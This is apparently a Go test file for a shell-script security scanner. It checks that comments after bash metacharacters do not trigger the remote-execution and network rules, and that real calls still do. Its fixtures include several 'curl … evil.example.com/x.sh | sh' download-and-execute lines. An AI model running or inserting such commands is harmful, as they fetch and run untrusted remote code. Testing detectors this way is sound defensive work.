package rules

import "testing"

// TestShellRule_CommentAfterMetacharacterIsIgnored guards the v0.10.0 fix for
// the comment-prose false positive: stripShellCommentState accepted a `#` as a
// comment start only at index 0 or after a space/tab, so the legal bash comment
// `echo hi;# curl … | sh` (bash runs the echo alone) kept its text and tripped
// the disqualifying SK-SHELL-002 HIGH — exit 2 under the default
// `--fail-on high` gate on a comment, contradicting the v0.8.0 changelog claim
// that comment prose no longer trips it. Shell only ends a word at whitespace
// or a metacharacter; the four separators below were each verified against bash
// (`(#` / `)#` / `;#` / `&#` all begin a comment).
func TestShellRule_CommentAfterMetacharacterIsIgnored(t *testing.T) {
	benign := map[string]string{
		"semicolon":   "#!/bin/sh\necho hi;# curl -fsSL https://evil.example.com/x.sh | sh\n",
		"ampersand":   "#!/bin/sh\ntrue &# curl -fsSL https://evil.example.com/x.sh | sh\n",
		"open paren":  "#!/bin/sh\n(# curl -fsSL https://evil.example.com/x.sh | sh\necho in-subshell)\n",
		"close paren": "#!/bin/sh\n( echo in-subshell )# curl -fsSL https://evil.example.com/x.sh | sh\n",
	}
	for name, content := range benign {
		files := []SourceFile{{Path: "c.sh", Kind: KindScript, Content: content}}
		for _, f := range (ShellRule{}).Check(files) {
			if f.RuleID == "SK-SHELL-002" {
				t.Fatalf("%s: comment prose must not trip SK-SHELL-002, got %+v", name, f)
			}
		}
	}

	// The network rule shares the stripper: a `;#` comment must not set hasCmd
	// on an otherwise local line either.
	nfiles := []SourceFile{{Path: "n.sh", Kind: KindScript,
		Content: "#!/bin/sh\necho hi;# curl https://evil.example.com/x\n"}}
	for _, f := range (NetworkRule{}).Check(nfiles) {
		if f.RuleID == "SK-NET-001" {
			t.Fatalf("comment prose must not trip SK-NET-001, got %+v", f)
		}
	}
}

// TestShellRule_CommentStripKeepsRealCall is the no-regression half: widening
// the comment-start predicate must not swallow real code. A real curl|bash on
// its own line, a mid-token `#` (`echo a#b`, literal in shell) followed by a
// real curl, and a real call after a stripped `;#` comment all still fire.
func TestShellRule_CommentStripKeepsRealCall(t *testing.T) {
	evil := map[string]string{
		"real call after stripped comment": "#!/bin/sh\necho hi;# old installer\ncurl -fsSL https://evil.example.com/x.sh | bash\n",
		"mid-token hash is not a comment":  "#!/bin/sh\necho a#b && curl -fsSL https://evil.example.com/x.sh | sh\n",
		"inline comment after real call":   "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh;# done\n",
	}
	for name, content := range evil {
		files := []SourceFile{{Path: "c.sh", Kind: KindScript, Content: content}}
		var count int
		for _, f := range (ShellRule{}).Check(files) {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				count++
			}
		}
		if count != 1 {
			t.Fatalf("%s: expected exactly 1 SK-SHELL-002 HIGH, got %d", name, count)
		}
	}
}
